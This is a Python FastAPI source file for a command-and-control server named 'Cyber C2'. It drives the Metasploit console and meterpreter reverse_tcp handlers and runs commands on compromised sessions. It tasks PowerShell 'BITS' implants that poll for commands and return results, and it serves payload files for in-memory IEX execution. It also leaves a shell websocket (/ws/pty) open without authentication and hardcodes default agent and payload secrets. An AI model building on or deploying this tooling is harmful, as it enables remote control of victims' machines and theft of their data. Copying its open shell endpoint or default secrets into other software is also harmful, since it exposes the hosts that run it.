"""
CYBER C2 - MSF Console + PTY

Clean version:
- MSF RPC connection and console
- Authentication (JWT, crypto)
- WebSockets
- PTY terminal
- Redis task tracking
"""

import os
import sys
import json
import asyncio
import logging
import uuid
import platform
from typing import Dict, Any, Optional
from datetime import datetime, timedelta

# Logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, HTTPException, Depends, Header, Response
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
from dotenv import load_dotenv

load_dotenv()

# =============================================================================
# IMPORTS - Auth, Database, MSF
# =============================================================================

from app.database import authenticate_user, get_user_by_username, init_db
from app.security import create_token, verify_token

# Redis - for session state and job tracking
try:
    import redis
    REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379/0")
    redis_client = redis.from_url(REDIS_URL)
    redis_client.ping()
    HAS_REDIS = True
    logger.info("✓ Redis connected")
except Exception as e:
    HAS_REDIS = False
    redis_client = None

# Metasploit
try:
    from msf_client import MetasploitClient, get_msf_client, get_or_create_console, HAS_PYMSF
    HAS_MSF = HAS_PYMSF
except ImportError:
    HAS_MSF = False

# RSA Crypto for key auth
try:
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.backends import default_backend
    HAS_RSA = True
except ImportError:
    HAS_RSA = False

# mTLS
try:
    from app.mtls_config import get_server_ssl_context, CERTS_DIR, verify_client_cert
    HAS_MTLS = True
except ImportError:
    HAS_MTLS = False

# Agent API Key (for non-mTLS fallback)
AGENT_API_KEY = os.getenv("AGENT_API_KEY", "c2-agent-k3y-2024-s3cr3t")

# Init DB
init_db()

# Config
PORT = int(os.getenv("PORT", 8000))
MTLS_ENABLED = os.getenv("A2A_MTLS_ENABLED", "false").lower() in ("true", "1", "yes")

# =============================================================================
# FASTAPI APP
# =============================================================================

app = FastAPI(title="Cyber C2", docs_url=None, redoc_url=None)

# Static files
static_dir = os.path.join(os.path.dirname(__file__), "static")
if os.path.exists(static_dir):
    app.mount("/static", StaticFiles(directory=static_dir), name="static")
    app.mount("/js", StaticFiles(directory=os.path.join(static_dir, "js")), name="js")
    app.mount("/css", StaticFiles(directory=os.path.join(static_dir, "css")), name="css")

# Payloads directory - protected with token (not static mount)
payloads_dir = os.path.join(os.path.dirname(__file__), "payloads")
PAYLOAD_TOKEN = os.getenv("PAYLOAD_TOKEN", "X7k9mP2vL4qR8nT1")  # Change this!

# =============================================================================
# MODELS
# =============================================================================

class LoginRequest(BaseModel):
    username: str
    password: str

class TokenRequest(BaseModel):
    token: str

class KeyAuthRequest(BaseModel):
    private_key: str

# =============================================================================
# WEBSOCKET MANAGER
# =============================================================================

class ConnectionManager:
    def __init__(self):
        self.connections: Dict[str, WebSocket] = {}
    
    async def connect(self, websocket: WebSocket, username: str):
        await websocket.accept()
        self.connections[username] = websocket
        logger.info(f"🔌 Connected: {username}")
    
    def disconnect(self, username: str):
        if username in self.connections:
            del self.connections[username]
            logger.info(f"🔌 Disconnected: {username}")
    
    async def send(self, username: str, message: Dict[str, Any]):
        if username in self.connections:
            await self.connections[username].send_json(message)

manager = ConnectionManager()

# =============================================================================
# AUTH HELPERS
# =============================================================================

import hashlib
import hmac
import time

# Time window for signature validity (seconds)
SIGNATURE_WINDOW = 300  # 5 minutes

def verify_agent_signature(agent_id: str, timestamp: str, signature: str) -> bool:
    """
    Verify HMAC-SHA256 signature from agent.
    Agent computes: SHA256(AGENT_API_KEY + agent_id + timestamp)
    This prevents replay attacks and key exposure in traffic.
    """
    try:
        # Check timestamp is within window
        ts = int(timestamp)
        now = int(time.time())
        if abs(now - ts) > SIGNATURE_WINDOW:
            return False
        
        # Compute expected signature
        message = f"{agent_id}{timestamp}"
        expected = hmac.new(
            AGENT_API_KEY.encode(),
            message.encode(),
            hashlib.sha256
        ).hexdigest()
        
        # Constant-time comparison to prevent timing attacks
        return hmac.compare_digest(signature, expected)
    except:
        return False

async def require_auth(authorization: str = Header(None, alias="Authorization")):
    """Require valid JWT token."""
    if not authorization:
        raise HTTPException(status_code=401, detail="Missing Authorization header")
    
    token = authorization[7:] if authorization.startswith("Bearer ") else authorization
    payload = verify_token(token)
    if not payload:
        raise HTTPException(status_code=401, detail="Invalid token")
    
    return payload

async def require_admin(payload: dict = Depends(require_auth)):
    """Require admin role."""
    if "admin" not in payload.get("roles", []):
        raise HTTPException(status_code=403, detail="Admin required")
    return payload

async def verify_agent_auth(
    request: Request,
    x_signature: str = Header(None, alias="X-Signature"),
    x_timestamp: str = Header(None, alias="X-Timestamp"),
    x_agent_id: str = Header(None, alias="X-Agent-ID"),
    x_api_key: str = Header(None, alias="X-API-Key")
):
    """
    Verify agent authentication via:
    1. mTLS client certificate (if available)
    2. HMAC-SHA256 signature (key never sent in traffic!)
    3. Simple API key fallback (for testing/simple agents)
    
    Headers required (option 1 - HMAC):
    - X-Agent-ID: agent identifier
    - X-Timestamp: unix timestamp
    - X-Signature: SHA256(secret + agent_id + timestamp)
    
    Headers required (option 2 - Simple):
    - X-API-Key: the secret key
    """
    # Try mTLS first
    if HAS_MTLS:
        try:
            if verify_client_cert(request):
                return True
        except:
            pass
    
    # Verify HMAC-SHA256 signature
    if x_signature and x_timestamp and x_agent_id:
        if verify_agent_signature(x_agent_id, x_timestamp, x_signature):
            return True
    
    # Simple API key fallback (less secure but works)
    if x_api_key and x_api_key == AGENT_API_KEY:
        return True
    
    raise HTTPException(status_code=401, detail="Invalid agent credentials")

# =============================================================================
# ROUTES - STATIC
# =============================================================================

@app.get("/", response_class=HTMLResponse)
async def root():
    html_path = os.path.join(static_dir, "index.html")
    with open(html_path, "r") as f:
        return f.read()

@app.get("/_next/{path:path}")
async def catch_next(path: str):
    return Response(status_code=204)

# =============================================================================
# ROUTES - PROTECTED PAYLOADS
# =============================================================================

@app.get("/payloads/{filename:path}")
async def get_payload(filename: str, key: Optional[str] = None, x_key: Optional[str] = Header(None)):
    """Protected payload delivery - requires token via ?key= or X-Key header"""
    token = key or x_key
    if token != PAYLOAD_TOKEN:
        # Return 404 instead of 403 to not reveal endpoint exists
        raise HTTPException(status_code=404, detail="Not Found")
    
    filepath = os.path.join(payloads_dir, filename)
    if not os.path.exists(filepath) or not os.path.isfile(filepath):
        raise HTTPException(status_code=404, detail="Not Found")
    
    # Prevent directory traversal
    if ".." in filename or not os.path.abspath(filepath).startswith(os.path.abspath(payloads_dir)):
        raise HTTPException(status_code=404, detail="Not Found")
    
    with open(filepath, "r") as f:
        content = f.read()
    
    # Return as plain text for IEX
    return Response(content=content, media_type="text/plain")

# =============================================================================
# ROUTES - AUTH
# =============================================================================

@app.post("/auth/login")
async def login(request: LoginRequest):
    user = authenticate_user(request.username, request.password)
    if not user:
        raise HTTPException(status_code=401, detail="Invalid credentials")
    
    roles = user.get("roles", ["user"])
    if isinstance(roles, str):
        roles = roles.split(",")
    token = create_token(request.username, roles=roles)
    return {"token": token, "user": {"username": request.username, "roles": roles}}

@app.post("/auth/verify")
async def verify_auth(request: TokenRequest):
    payload = verify_token(request.token)
    if not payload:
        raise HTTPException(status_code=401, detail="Invalid token")
    return {"valid": True, "user": payload.get("sub")}

@app.get("/auth/challenge")
async def get_challenge():
    """Generate challenge for key-based auth."""
    challenge = os.urandom(32).hex()
    return {"challenge": challenge, "expires_in": 300}

@app.post("/auth/key")
async def key_auth(request: KeyAuthRequest):
    """Authenticate with RSA private key - server verifies against public key in .env."""
    if not HAS_RSA:
        raise HTTPException(status_code=401, detail="Authentication failed")
    
    # Get public key from .env
    public_key_pem = os.getenv("ADMIN_PUBLIC_KEY", "").strip()
    if not public_key_pem:
        raise HTTPException(status_code=401, detail="Authentication failed")
    
    # Add PEM headers if missing
    if not public_key_pem.startswith("-----BEGIN"):
        public_key_pem = f"-----BEGIN PUBLIC KEY-----\n{public_key_pem}\n-----END PUBLIC KEY-----"
    
    try:
        # Load private key from request
        private_key_pem = request.private_key.strip()
        
        # Handle different key formats
        if not private_key_pem.startswith("-----BEGIN"):
            # Try RSA format first, then PKCS8
            private_key_pem = f"-----BEGIN RSA PRIVATE KEY-----\n{private_key_pem}\n-----END RSA PRIVATE KEY-----"
        
        try:
            private_key = serialization.load_pem_private_key(
                private_key_pem.encode(),
                password=None,
                backend=default_backend()
            )
        except Exception:
            # If RSA format fails and no headers were provided, try PKCS8
            if "RSA PRIVATE KEY" in private_key_pem:
                pkcs8_pem = private_key_pem.replace("RSA PRIVATE KEY", "PRIVATE KEY")
                private_key = serialization.load_pem_private_key(
                    pkcs8_pem.encode(),
                    password=None,
                    backend=default_backend()
                )
            else:
                raise
        
        # Load public key from env
        public_key = serialization.load_pem_public_key(
            public_key_pem.encode(),
            backend=default_backend()
        )
        
        # Derive public key from private key and compare
        derived_public = private_key.public_key()
        derived_pem = derived_public.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ).decode()
        
        stored_pub = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ).decode()
        
        if derived_pem.strip() != stored_pub.strip():
            raise HTTPException(status_code=401, detail="Authentication failed")
        
        # Success - create token for admin
        username = "admin"
        roles = ["admin", "cyber", "researcher", "analyst"]
        token = create_token(username, roles=roles)
        
        return {
            "success": True,
            "access_token": token,
            "user": {"username": username, "roles": roles}
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Key auth error: {e}")
        raise HTTPException(status_code=401, detail="Authentication failed")

# =============================================================================
# ROUTES - PTY WEBSOCKET (must be before /ws/{username} to avoid route collision)
# =============================================================================

@app.websocket("/ws/pty")
async def pty_websocket(websocket: WebSocket):
    """PTY WebSocket for real shell - full interactive terminal."""
    await websocket.accept()
    logger.info("🖥️ PTY connected")
    
    shell = os.environ.get("SHELL", "/bin/zsh")
    
    # Use script for PTY on macOS
    if platform.system() == "Darwin":
        cmd = ["script", "-q", "/dev/null", shell]
    else:
        cmd = ["script", "-q", "-c", shell, "/dev/null"]
    
    try:
        process = await asyncio.create_subprocess_exec(
            *cmd,
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
            env={**os.environ, "TERM": "xterm-256color", "COLORTERM": "truecolor"}
        )
        
        async def read_output():
            try:
                while True:
                    data = await process.stdout.read(4096)
                    if not data:
                        break
                    await websocket.send_text(data.decode("utf-8", errors="replace"))
            except:
                pass
        
        async def write_input():
            try:
                while True:
                    msg = await websocket.receive_text()
                    data = json.loads(msg)
                    
                    if data.get("type") == "input":
                        process.stdin.write(data["data"].encode("utf-8"))
                        await process.stdin.drain()
                    elif data.get("type") == "resize":
                        pass  # Can't easily resize subprocess PTY
            except:
                pass
        
        read_task = asyncio.create_task(read_output())
        write_task = asyncio.create_task(write_input())
        
        done, pending = await asyncio.wait(
            [read_task, write_task],
            return_when=asyncio.FIRST_COMPLETED
        )
        
        for task in pending:
            task.cancel()
            
    except Exception as e:
        logger.error(f"PTY error: {e}")
        await websocket.send_text(f"\r\n[!] PTY error: {e}\r\n")
    finally:
        try:
            process.terminate()
            await process.wait()
        except:
            pass
    
    logger.info("🖥️ PTY closed")

# =============================================================================
# ROUTES - WEBSOCKET MAIN
# =============================================================================

@app.websocket("/ws/{username}")
async def websocket_endpoint(websocket: WebSocket, username: str, token: str = None):
    """Main WebSocket for MSF status updates."""
    if not token:
        await websocket.close(code=4001)
        return
    
    payload = verify_token(token)
    if not payload or payload.get("sub") != username:
        await websocket.close(code=4001)
        return
    
    await manager.connect(websocket, username)
    
    try:
        await websocket.send_json({"type": "system", "message": "Synced with server"})
        
        while True:
            data = await websocket.receive_json()
            if data.get("type") == "ping":
                await websocket.send_json({"type": "pong"})
    
    except WebSocketDisconnect:
        manager.disconnect(username)
    except Exception as e:
        logger.error(f"WebSocket error: {e}")
        manager.disconnect(username)

# =============================================================================
# BITS C2 INTEGRATION
# =============================================================================

# BITS C2 State
bits_agents = {}  # {agent_id: {last_seen, status}}
bits_commands = {}  # {agent_id: command}
bits_results = {}  # {agent_id: result}
bits_websockets = {}  # {session_id: WebSocket}

@app.get("/bits/agents")
async def bits_get_agents(username: str = Depends(verify_token)):
    """Get all BITS agents"""
    return JSONResponse({
        "agents": bits_agents,
        "results": bits_results
    })

@app.post("/bits/command")
async def bits_send_command(request: Request, username: str = Depends(verify_token)):
    """Send command to BITS agent"""
    data = await request.json()
    agent_id = data.get("agent_id")
    command = data.get("command")
    
    if not agent_id or not command:
        raise HTTPException(400, "Missing agent_id or command")
    
    bits_commands[agent_id] = command
    logger.info(f"[BITS] Queued command for {agent_id}: {command}")
    
    # Broadcast to all BITS WebSocket clients
    for ws in bits_websockets.values():
        try:
            await ws.send_json({
                "type": "command_sent",
                "agent_id": agent_id,
                "command": command
            })
        except:
            pass
    
    return JSONResponse({"status": "ok"})

# BITS Agent API (called by PowerShell agents) - PROTECTED
@app.get("/bits/cmd/{agent_id}")
async def bits_get_cmd(agent_id: str, request: Request, auth: bool = Depends(verify_agent_auth)):
    """Get pending command for agent - auto-registers if new"""
    # Auto-register on first poll (no separate register endpoint needed)
    if agent_id not in bits_agents:
        bits_agents[agent_id] = {
            'last_seen': datetime.now().isoformat(),
            'status': 'active'
        }
        logger.info(f"[BITS] Agent auto-registered: {agent_id}")
        # Broadcast to WebSocket clients
        for ws in bits_websockets.values():
            try:
                await ws.send_json({
                    "type": "agent_connected",
                    "agent_id": agent_id
                })
            except:
                pass
    else:
        bits_agents[agent_id]['last_seen'] = datetime.now().isoformat()
    
    cmd = bits_commands.pop(agent_id, "")
    return JSONResponse({"command": cmd})

@app.post("/bits/result/{agent_id}")
async def bits_post_result(agent_id: str, request: Request, auth: bool = Depends(verify_agent_auth)):
    """Receive command result from agent"""
    data = await request.json()
    result = data.get('result', '')
    
    bits_results[agent_id] = result
    logger.info(f"[BITS] Result from {agent_id}: {len(result)} bytes")
    
    # Broadcast to WebSocket clients
    for ws in bits_websockets.values():
        try:
            await ws.send_json({
                "type": "result",
                "agent_id": agent_id,
                "result": result
            })
        except:
            pass
    
    return JSONResponse({"status": "ok"})

@app.websocket("/ws-bits")
async def bits_websocket(websocket: WebSocket):
    """BITS C2 WebSocket for real-time updates"""
    
    # Accept connection first
    await websocket.accept()
    
    # Get token from query params
    token = websocket.query_params.get("token")
    
    if not token:
        logger.error("[BITS WS] No token provided")
        await websocket.close(code=4001)
        return
    
    # Verify token
    try:
        payload = verify_token(token)
        if not payload:
            logger.error("[BITS WS] Invalid token")
            await websocket.close(code=4001)
            return
        username = payload.get("sub")
        logger.info(f"[BITS WS] Token verified for user: {username}")
    except Exception as e:
        logger.error(f"[BITS WS] Token verification failed: {e}")
        await websocket.close(code=4001)
        return
    
    session_id = str(uuid.uuid4())
    bits_websockets[session_id] = websocket
    
    logger.info(f"[BITS WS] Connected: {username}")
    
    # Send current state
    await websocket.send_json({
        "type": "init",
        "agents": bits_agents,
        "results": bits_results
    })
    
    try:
        while True:
            data = await websocket.receive_json()
            
            if data.get("type") == "command":
                agent_id = data.get("agent_id")
                command = data.get("command")
                
                if agent_id and command:
                    bits_commands[agent_id] = command
                    logger.info(f"[BITS] Command from WS: {agent_id} -> {command}")
                    
                    # Broadcast to other clients
                    for sid, ws in bits_websockets.items():
                        if sid != session_id:
                            try:
                                await ws.send_json({
                                    "type": "command_sent",
                                    "agent_id": agent_id,
                                    "command": command
                                })
                            except:
                                pass
            
            elif data.get("type") == "ping":
                await websocket.send_json({"type": "pong"})
    
    except WebSocketDisconnect:
        logger.info(f"[BITS WS] Disconnected: {username}")
    except Exception as e:
        logger.error(f"[BITS WS] Error: {e}")
    finally:
        bits_websockets.pop(session_id, None)

# =============================================================================
# ROUTES - MSF API
# =============================================================================

@app.get("/api/msf/status")
async def msf_status(auth: dict = Depends(require_admin)):
    if not HAS_MSF:
        return {"connected": False, "error": "MSF not available"}
    msf = get_msf_client()
    return {"connected": msf.is_connected(), "host": msf.host, "port": msf.port}

@app.post("/api/msf/connect")
async def msf_connect(request: Request, auth: dict = Depends(require_admin)):
    if not HAS_MSF:
        return {"success": False, "error": "MSF not available"}
    
    try:
        data = await request.json()
    except:
        data = {}
    
    msf = get_msf_client()
    try:
        msf.connect(
            password=data.get("password", msf.password),
            host=data.get("host", msf.host),
            port=data.get("port", msf.port),
            ssl=data.get("ssl", msf.ssl)
        )
        return {"success": True, "message": f"Connected to {msf.host}:{msf.port}"}
    except Exception as e:
        return {"success": False, "error": str(e)}

@app.post("/api/msf/disconnect")
async def msf_disconnect(auth: dict = Depends(require_admin)):
    if HAS_MSF:
        get_msf_client().disconnect()
    return {"success": True}

@app.get("/api/msf/sessions")
async def msf_sessions(auth: dict = Depends(require_admin)):
    if not HAS_MSF:
        return {"sessions": []}
    msf = get_msf_client()
    if not msf.is_connected():
        return {"sessions": []}
    
    sessions = []
    for sid, info in msf.get_sessions().items():
        sessions.append({
            "id": sid, "type": info.get("type", "unknown"),
            "tunnel_peer": info.get("tunnel_peer", ""),
            "target_host": info.get("target_host", ""),
            "platform": info.get("platform", ""),
            "info": info.get("info", "")
        })
    return {"sessions": sessions}

@app.post("/api/msf/sessions/{session_id}/execute")
async def msf_session_execute(session_id: str, request: Request, auth: dict = Depends(require_admin)):
    if not HAS_MSF:
        return {"error": "MSF not available"}
    msf = get_msf_client()
    if not msf.is_connected():
        return {"error": "Not connected"}
    
    data = await request.json()
    command = data.get("command", "")
    session_info = msf.get_session(session_id)
    if not session_info:
        return {"error": f"Session {session_id} not found"}
    
    if session_info.get("type") == "meterpreter":
        output = msf.meterpreter_run(session_id, command)
    else:
        output = msf.shell_execute(session_id, command)
    return {"success": True, "output": output}

@app.delete("/api/msf/sessions/{session_id}")
async def msf_session_kill(session_id: str, auth: dict = Depends(require_admin)):
    if HAS_MSF:
        try:
            get_msf_client().kill_session(session_id)
        except:
            pass  # Session already dead, ignore
    return {"success": True}

@app.get("/api/msf/jobs")
async def msf_jobs(auth: dict = Depends(require_admin)):
    if not HAS_MSF:
        return {"jobs": {}}
    msf = get_msf_client()
    return {"jobs": msf.get_jobs() if msf.is_connected() else {}}

@app.delete("/api/msf/jobs/{job_id}")
async def msf_kill_job(job_id: int, auth: dict = Depends(require_admin)):
    if HAS_MSF:
        return get_msf_client().stop_job(job_id)
    return {"success": False}

@app.get("/api/msf/certs")
async def msf_certs(auth: dict = Depends(require_admin)):
    """List available SSL certificates"""
    import os
    certs = []
    cert_dirs = ["certs"]
    
    for cert_dir in cert_dirs:
        if os.path.isdir(cert_dir):
            for f in os.listdir(cert_dir):
                if f.endswith(('.pem', '.crt', '.cer')):
                    certs.append({
                        "name": f,
                        "path": os.path.join(cert_dir, f)
                    })
    
    return {"certs": certs}

@app.post("/api/msf/listener")
async def msf_listener(request: Request, auth: dict = Depends(require_admin)):
    if not HAS_MSF:
        return {"error": "MSF not available"}
    msf = get_msf_client()
    if not msf.is_connected():
        return {"error": "Not connected"}
    
    data = await request.json()
    return msf.start_handler(
        data.get("payload", "windows/x64/meterpreter/reverse_tcp"),
        data.get("lhost", "0.0.0.0"),
        data.get("lport", 4444),
        use_ssl=data.get("ssl", False),
        ssl_cert=data.get("ssl_cert"),
        override_lhost=data.get("override_lhost"),
        override_lport=data.get("override_lport"),
        override_request_host=data.get("override_request_host", False)
    )

# =============================================================================
# ROUTES - MSF CONSOLE (msfconsole passthrough)
# =============================================================================

@app.post("/api/msf/console/create")
async def msf_console_create(auth: dict = Depends(require_admin)):
    if not HAS_MSF:
        return {"error": "MSF not available"}
    msf = get_msf_client()
    if not msf.is_connected():
        return {"error": "Not connected to MSF RPC"}
    
    result = msf.console_create()
    if "error" in result:
        return result
    return {"success": True, "console_id": result.get("id")}

@app.post("/api/msf/console/execute")
async def msf_console_execute(request: Request, auth: dict = Depends(require_admin)):
    if not HAS_MSF:
        return {"error": "MSF not available"}
    msf = get_msf_client()
    if not msf.is_connected():
        return {"error": "Not connected to MSF RPC"}
    
    data = await request.json()
    command = data.get("command", "")
    console_id = data.get("console_id")
    
    if not console_id:
        console_id = get_or_create_console()
        if not console_id:
            return {"error": "Failed to get console"}
    
    result = msf.console_execute(console_id, command)
    
    # Map output to data for JS compatibility
    return {
        "success": True, 
        "console_id": console_id,
        "data": result.get("output", ""),
        "prompt": result.get("prompt", ""),
        "busy": result.get("busy", False)
    }

@app.post("/api/msf/console/read")
async def msf_console_read(request: Request, auth: dict = Depends(require_admin)):
    if not HAS_MSF:
        return {"error": "MSF not available"}
    msf = get_msf_client()
    if not msf.is_connected():
        return {"error": "Not connected to MSF RPC"}
    
    data = await request.json()
    console_id = data.get("console_id")
    if not console_id:
        return {"error": "No console_id provided"}
    
    result = msf.console_read(console_id)
    return result

# =============================================================================
# ROUTES - HEALTH
# =============================================================================

@app.get("/health")
async def health():
    """Basic health check - no sensitive info"""
    return {"status": "ok"}

# =============================================================================
# MAIN
# =============================================================================

if __name__ == "__main__":
    import uvicorn
    import ssl
    
    # Check for SSL certificates
    cert_file = os.path.join(CERTS_DIR, "server.crt") if HAS_MTLS else None
    key_file = os.path.join(CERTS_DIR, "server.key") if HAS_MTLS else None
    ca_file = os.path.join(CERTS_DIR, "ca.crt") if HAS_MTLS else None
    
    # Environment variable to enable/disable HTTPS
    USE_HTTPS = os.getenv("USE_HTTPS", "true").lower() in ("true", "1", "yes")
    USE_MTLS = os.getenv("USE_MTLS", "false").lower() in ("true", "1", "yes")
    
    if USE_HTTPS and cert_file and os.path.exists(cert_file):
        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_context.load_cert_chain(certfile=cert_file, keyfile=key_file)
        
        if USE_MTLS and ca_file and os.path.exists(ca_file):
            # mTLS - require client certificates
            ssl_context.verify_mode = ssl.CERT_REQUIRED
            ssl_context.load_verify_locations(ca_file)
            logger.info("🔐 Starting with mTLS (client cert required)")
        else:
            # TLS only - no client cert required
            ssl_context.verify_mode = ssl.CERT_NONE
            logger.info("🔒 Starting with HTTPS (TLS)")
        
        uvicorn.run(app, host="0.0.0.0", port=8000, ssl_keyfile=key_file, ssl_certfile=cert_file)
    else:
        logger.warning("⚠️  Starting WITHOUT HTTPS - NOT SAFE FOR INTERNET!")
        uvicorn.run(app, host="0.0.0.0", port=8000)
